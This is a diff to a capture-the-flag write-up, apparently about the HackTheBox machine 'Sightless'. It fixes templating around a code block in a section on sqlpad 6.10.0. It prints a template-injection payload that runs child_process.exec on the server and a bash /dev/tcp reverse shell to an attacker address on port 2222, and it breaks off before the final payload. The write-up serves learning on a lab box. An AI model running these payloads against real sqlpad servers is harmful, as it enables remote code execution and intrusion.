@@ -78,9 +78,11 @@ It's a really simple web page, none of the buttons work. I could try to brutefor
 Going to sqlpad.sightless.htb gives us access to a simple sqlpad interface : 
 ![sqlpad.png](/assets/img/sightless/sqlpad.png)
 This is the right time to keep in mind that this is an easy box. Where on an insane/hard, we would probably have to understand a lot about how sqlpad works, this is not the case here. In fact we are on google search away from getting a shell. The website displays `sqlpad version 6.10.0`. Googling sqlpad exploit leads to [this post](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb), which describes a vulnerability affecting all sqlpad instance for versions prior to 6.10.1. The payload is the following :
+{% raw %}
 ```python
-{{ "{{ process.mainModule.require('child_process').exec('id>/tmp/pwn') }}" }}
+{{ process.mainModule.require('child_process').exec('id>/tmp/pwn') }}
 ```
+{% endraw %}
 To get a shell from it, I'll use the standard bash reverse shell, and base64 encode it to avoid bad characters :
 `bash -i >& /dev/tcp/10.10.14.201/2222 0>&1`. My final payload is :
 {% raw %}
